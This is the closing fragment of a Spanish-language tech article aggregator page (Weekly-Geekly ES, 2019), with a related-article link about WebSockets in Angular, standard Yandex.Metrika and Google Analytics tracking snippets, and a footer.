<li><a href="../es416155/index.html">WebSockets en Angular: cree un servicio angular para trabajar con sockets web</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>